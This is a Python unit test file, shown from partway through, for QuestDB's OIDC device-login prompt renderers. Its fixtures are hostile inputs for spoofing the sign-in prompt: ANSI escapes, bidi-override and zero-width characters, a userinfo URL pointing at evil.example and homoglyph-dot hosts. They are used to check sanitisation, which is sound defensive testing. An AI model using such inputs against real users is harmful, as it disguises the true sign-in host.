            def __init__(self, *a, **k):
                pass

            def add_data(self, *a):
                pass

            def make(self, *a, **k):
                pass

            def print_ascii(self, *a, out=None, **k):
                out.write('QR-ART')

        fake_qrcode.QRCode = _QR
        buf = io.StringIO()
        with mock.patch.dict(sys.modules, {'qrcode': fake_qrcode}):
            TerminalRenderer(stream=buf, qr=True).on_prompt({
                'user_code': 'X',
                'verification_uri': 'https://idp.example.com/device',
                'expires_in': 600, 'interval': 5})
        self.assertIn('QR-ART', buf.getvalue())

    def test_detect_interactive_requires_tty(self):
        # Outside a notebook kernel, interactivity requires both stdin AND stdout
        # to be a TTY (guards against hanging in papermill / cron / CI).
        from questdb.auth import _render
        with mock.patch.object(_render, 'in_ipython_kernel', return_value=False):
            with mock.patch.object(sys, 'stdin') as si, \
                    mock.patch.object(sys, 'stdout') as so:
                si.isatty.return_value = True
                so.isatty.return_value = True
                self.assertTrue(_render.detect_interactive())
                so.isatty.return_value = False  # stdout not a tty
                self.assertFalse(_render.detect_interactive())

    def test_in_ipython_kernel_false_without_ipython(self):
        # When IPython can't be imported (plain CPython), it's not a kernel.
        from questdb.auth import _render
        with mock.patch.dict(sys.modules, {'IPython': None}):
            self.assertFalse(_render.in_ipython_kernel())

    def test_jupyter_prompt_strips_control_and_bidi_chars(self):
        # M3: the Jupyter path must ALSO strip control / bidi / zero-width chars
        # from untrusted device-response fields — html.escape neutralizes markup
        # but NOT a U+202E bidi override or zero-width chars, which can visually
        # spoof the sign-in prompt in the notebook DOM. chr(cp) keeps the
        # invisible characters out of the test source.
        from questdb.auth._render import JupyterRenderer

        captured = {}

        class _Capturing(JupyterRenderer):
            def _display(self, html_str):  # avoid importing IPython
                captured['html'] = html_str

        r = _Capturing()
        r.on_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB' + chr(0x200b),
            'verification_uri': 'https://idp.example.com/' + chr(0x202e),
            'verification_uri_complete':
                'https://idp.example.com/c' + chr(0x200b) + 'omplete',
            'expires_in': 600, 'interval': 5,
        })
        for cp in (0x202e, 0x200b):
            self.assertNotIn(chr(cp), captured['html'],
                             f'U+{cp:04X} reached the notebook DOM')
        self.assertIn('idp.example.com', captured['html'])

        # identity (untrusted JWT claim) on success and error_description on
        # failure are sanitized too — both re-render the prompt head.
        r.on_success('alice' + chr(0x202e) + '@evil', 3600)
        self.assertNotIn(chr(0x202e), captured['html'])
        r.on_failure('access denied ' + chr(0x202e) + 'spoof')
        self.assertNotIn(chr(0x202e), captured['html'])

    def test_terminal_prompt_strips_control_chars(self):
        # A hostile/MITM'd device response must not inject ANSI escape sequences
        # into the plain-text terminal prompt (cursor moves / screen clears that
        # could spoof the sign-in URL). The Jupyter path html-escapes; the
        # terminal path strips control characters. See M5.
        import io
        from questdb.auth._render import format_prompt, TerminalRenderer
        resp = {
            'user_code': 'WDJB\x1bMJHT',
            'verification_uri': 'https://idp.example.com/\x1b[31mdevice',
            'verification_uri_complete': 'https://idp.example.com/d\x07ev',
        }
        text = format_prompt(resp)
        self.assertNotIn('\x1b', text)            # ESC stripped
        self.assertNotIn('\x07', text)            # BEL stripped
        self.assertIn('WDJBMJHT', text)           # printable user_code survives
        self.assertIn('idp.example.com', text)

        # The full terminal path (on_prompt + on_failure) is clean too.
        buf = io.StringIO()
        r = TerminalRenderer(stream=buf)
        r.on_prompt(resp)
        r.on_failure('denied \x1b[2K by idp')     # IdP error_description path
        out = buf.getvalue()
        self.assertNotIn('\x1b', out)
        self.assertNotIn('\x07', out)

    def test_terminal_prompt_survives_unencodable_stream(self):
        # On a stream whose encoding can't represent the prompt's emoji (a
        # legacy code-page Windows console, an `ascii` PYTHONIOENCODING, or a
        # redirected stderr), the decorative glyphs must degrade but the
        # verification URL and user code must STILL reach the user — not vanish
        # into a silent hang. M3.
        from questdb.auth._render import TerminalRenderer

        class _AsciiStream:
            encoding = 'ascii'

            def __init__(self):
                self.parts = []

            def write(self, s):
                s.encode(self.encoding)  # raises UnicodeEncodeError, like a TTY
                self.parts.append(s)

            def flush(self):
                pass

        stream = _AsciiStream()
        r = TerminalRenderer(stream=stream)
        r.on_prompt({
            'user_code': 'WDJB-MJHT',
            'verification_uri': 'https://idp.example.com/device',
        })
        r.on_success('alice@example.com', 3600)
        r.on_failure('access denied')
        out = ''.join(stream.parts)
        # The essential content survived (only the un-encodable glyphs were
        # replaced); nothing was blackholed and no exception escaped.
        self.assertIn('https://idp.example.com/device', out)
        self.assertIn('WDJB-MJHT', out)
        self.assertIn('alice@example.com', out)
        self.assertIn('access denied', out)
        out.encode('ascii')  # the whole transcript is ascii-encodable

    def test_strip_control_removes_bidi_and_zero_width(self):
        # Beyond C0/C1, untrusted device-response fields must have Unicode
        # bidi-override / zero-width / line-separator characters stripped before
        # they reach a TTY: U+202E (RIGHT-TO-LEFT OVERRIDE) can visually reverse
        # a URL to spoof the sign-in host. chr(cp) avoids embedding the
        # (invisible) characters in the test source. See M2.
        from questdb.auth._render import _strip_control, format_prompt
        for cp in (0x202e, 0x202d, 0x2066, 0x2069, 0x200b, 0x200f,
                   0x2028, 0x2029, 0xfeff,
                   # also the format/bidi code points added for M3:
                   0x00ad, 0x061c, 0x115f, 0x180e, 0x2060, 0x2064, 0xfff9,
                   # the category-based strip also covers the deprecated U+206x
                   # format chars, the Tags block, unassigned code points,
                   # Arabic format marks and the other invisible Hangul fillers:
                   0x206a, 0x206f, 0x2065, 0xe0001, 0xe007f, 0x0600,
                   0x1160, 0x3164, 0xffa0):
            self.assertEqual(_strip_control('a' + chr(cp) + 'b'), 'ab',
                             f'U+{cp:04X} not stripped')
        # Legitimate text (incl. accents / CJK / printable ASCII) is preserved.
        self.assertEqual(_strip_control('café 北京 user-1'), 'café 北京 user-1')
        text = format_prompt({
            'user_code': 'WD' + chr(0x202e) + 'JB',
            'verification_uri': 'https://idp.example.com/' + chr(0x202e)})
        self.assertNotIn(chr(0x202e), text)
        self.assertIn('idp.example.com', text)

    def test_oidc_error_sanitizes_message_and_fields(self):
        # OidcError strips control/bidi chars from its message centrally, so no
        # raise site can leak an ANSI/bidi sequence into an uncaught traceback (a
        # display sink the renderer never sees). The device-flow subclass strips
        # its untrusted error / error_description attributes too. See M2.
        e = OidcError('boom ' + chr(0x1b) + '[31m' + chr(0x202e)
                      + 'hidden' + chr(0x07) + ' done')
        self.assertEqual(str(e), 'boom [31mhidden done')
        self.assertEqual(OidcError('x', status=503).status, 503)  # status kept
        d = OidcDeviceFlowError(
            'failed ' + chr(0x1b) + '[2Jx',
            error='bad' + chr(0x1b) + ']0;t' + chr(0x07),
            error_description='why ' + chr(0x202e) + 'flip' + chr(0x1b) + '[0m')
        for s in (str(d), d.error, d.error_description):
            self.assertNotIn(chr(0x1b), s)
            self.assertNotIn(chr(0x07), s)
            self.assertNotIn(chr(0x202e), s)
        self.assertIn('flip', d.error_description)  # readable text survives
        # Absent error / error_description stay None (not coerced to '').
        d2 = OidcDeviceFlowError('x')
        self.assertIsNone(d2.error)
        self.assertIsNone(d2.error_description)

    def test_oidc_error_sanitizes_non_string_arg(self):
        # A non-string positional arg is coerced through str() and sanitized too,
        # so an object whose text representation embeds ANSI/bidi can't leak it
        # into a traceback. No raise site passes one today — defense-in-depth. M6.
        class _Evil:
            def __str__(self):
                return 'boom \x1b[31m' + chr(0x202e) + 'spoof\x07'

        e = OidcError(_Evil())
        self.assertNotIn('\x1b', str(e))
        self.assertNotIn('\x07', str(e))
        self.assertNotIn(chr(0x202e), str(e))
        self.assertIn('boom', str(e))
        self.assertIn('spoof', str(e))

    def test_oidc_device_flow_error_tolerates_non_string_fields(self):
        # M1: a hostile/non-conformant IdP can put a non-string into the
        # error / error_description of a token or device-auth response. Building
        # OidcDeviceFlowError from it must NOT raise a raw TypeError — that would
        # escape the typed-error contract and, on the refresh path, slip past the
        # 'except OidcError' fallback (the TypeError would be raised DURING the
        # exception's construction, so it isn't an OidcError). The field is
        # coerced through str() and sanitized, mirroring OidcError's args.
        for bad in ({'code': 'denied'}, 12345, ['a', 'bb'], True):
            e = OidcDeviceFlowError('failed', error=bad, error_description=bad)
            self.assertIsInstance(e, OidcError)
            self.assertIsInstance(e.error, str)
            self.assertIsInstance(e.error_description, str)

        # A non-string whose text representation embeds an ANSI/bidi sequence is
        # still stripped (same traceback-sink concern as OidcError's message).
        class _Evil:
            def __str__(self):
                return 'denied \x1b[31m' + chr(0x202e) + 'spoof'
        e = OidcDeviceFlowError('failed', error=_Evil(),
                                error_description=_Evil())
        for s in (e.error, e.error_description):
            self.assertNotIn('\x1b', s)
            self.assertNotIn(chr(0x202e), s)
            self.assertIn('spoof', s)
        # Absent stays None (not coerced to '' or 'None').
        self.assertIsNone(OidcDeviceFlowError('x').error)
        self.assertIsNone(OidcDeviceFlowError('x').error_description)

    def test_userinfo_verification_url_not_auto_opened(self):
        # M2: a tampered device response whose verification URL embeds userinfo
        # (https://trusted@evil/) must NOT be auto-opened in the browser — it
        # would navigate to `evil` while reading as `trusted`. The same
        # _safe_link_url gate that makes it inert in the notebook also blocks the
        # browser auto-open on a terminal.
        auth = OidcDeviceAuth(
            client_id='c',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            open_browser=True)
        with mock.patch('webbrowser.open') as wb, \
                mock.patch('questdb.auth._device.in_ipython_kernel',
                           return_value=False):
            auth._maybe_open_browser({
                'verification_uri':
                    'https://login.questdb.io@evil.example/device'})
            wb.assert_not_called()
            # A legitimate URL is still opened.
            auth._maybe_open_browser(
                {'verification_uri': 'https://idp.example.com/device'})
            wb.assert_called_once_with('https://idp.example.com/device')

    def test_homoglyph_host_revealed_not_clickable(self):
        # A homoglyph "dot" in the host — fullwidth U+FF0E / one-dot-leader
        # U+2024 / ideographic U+3002 — IDNA-folds to a real '.', so the true
        # registrable domain is evil.com, visually masquerading as a trusted
        # host. It must be (a) never clickable / opened (the host-allowlist
        # rejects a non-ASCII host) and (b) shown IDNA-normalized, not echoed
        # raw, so the real host is legible.
        from questdb.auth._render import (
            _safe_link_url, _safe_target, _display_url, _render_link)
        for cp in (0xFF0E, 0x2024, 0x3002):
            raw = f'https://idp.example.com{chr(cp)}evil.com/device'
            self.assertIsNone(_safe_link_url(raw), f'U+{cp:04X} clickable')
            self.assertIsNone(_safe_target(raw))
            shown = _display_url(raw)
            self.assertNotIn(chr(cp), shown)                  # not echoed raw
            self.assertIn('idp.example.com.evil.com', shown)  # real host shown
            link = _render_link(raw)
            self.assertNotIn('<a ', link)                     # inert, no link
            self.assertNotIn(chr(cp), link)
        # The @-userinfo trick is likewise revealed (real host shown, no '@').
        self.assertEqual(
            _display_url('https://login.questdb.io@evil.example/device'),
            'https://evil.example/device')
        # A legitimate URL is shown unchanged and stays clickable.
        self.assertEqual(_display_url('https://idp.example.com/device'),
                         'https://idp.example.com/device')
        self.assertIn('<a href="https://idp.example.com/device"',
                      _render_link('https://idp.example.com/device'))

    def test_displayed_and_opened_target_do_not_diverge(self):
        # A control / zero-width char stripped from the on-screen link must NOT
        # survive into the URL actually opened or QR-encoded: the display, the
        # browser target and both QR encoders all use one _strip_control'd,
        # vetted value (_safe_target), so they cannot diverge.
        from questdb.auth._render import _safe_target, _display_url
        zwsp = chr(0x200b)
        raw = f'https://idp.example.com/de{zwsp}vice'   # zero-width space in path
        clean = 'https://idp.example.com/device'
        self.assertEqual(_safe_target(raw), clean)
        self.assertEqual(_display_url(raw), clean)
        self.assertNotIn(zwsp, _safe_target(raw))
        # End-to-end: the browser opens the stripped target, not the raw value.
        auth = OidcDeviceAuth(
            client_id='c',
            device_authorization_endpoint='https://idp.example.com/device',
            token_endpoint='https://idp.example.com/token',
            open_browser=True)
        with mock.patch('webbrowser.open') as wb, \
                mock.patch('questdb.auth._device.in_ipython_kernel',
                           return_value=False):
            auth._maybe_open_browser({'verification_uri': raw})
            wb.assert_called_once_with(clean)

    def test_qr_helpers_degrade_without_qrcode(self):
        # The QR helpers must degrade gracefully (return None), never raise,
        # when `qrcode` is absent or the data is empty. See M4.
        from questdb.auth import _render
        with mock.patch.dict(sys.modules, {'qrcode': None}):
            self.assertIsNone(_render._qr_ascii('https://idp/x'))
            self.assertIsNone(_render._qr_data_uri('https://idp/x'))
        self.assertIsNone(_render._qr_ascii(''))
        self.assertIsNone(_render._qr_data_uri(''))

    def test_non_string_verification_uri_does_not_crash(self):
        # A hostile/buggy device response with a non-string verification_uri /
        # _complete (e.g. a JSON number or list) must not crash the renderer
        # with a raw TypeError/AttributeError before the prompt is shown; the
        # field is coerced away. See _verification_uri / _safe_link_url.
        import io
        from questdb.auth._render import (
            format_prompt, TerminalRenderer, JupyterRenderer)
        resp = {'user_code': 'WDJB-MJHT', 'verification_uri': 12345,
                'verification_uri_complete': ['not', 'a', 'str'],
                'expires_in': 600, 'interval': 5}
        self.assertIn('WDJB-MJHT', format_prompt(resp))         # plain-text path
        TerminalRenderer(stream=io.StringIO()).on_prompt(resp)  # must not raise
        captured = {}

        class _Cap(JupyterRenderer):
            def _display(self, html_str):
                captured['html'] = html_str

        _Cap().on_prompt(resp)                                  # must not raise
        self.assertNotIn('<a ', captured['html'])               # no link, non-str


if __name__ == '__main__':
    unittest.main()
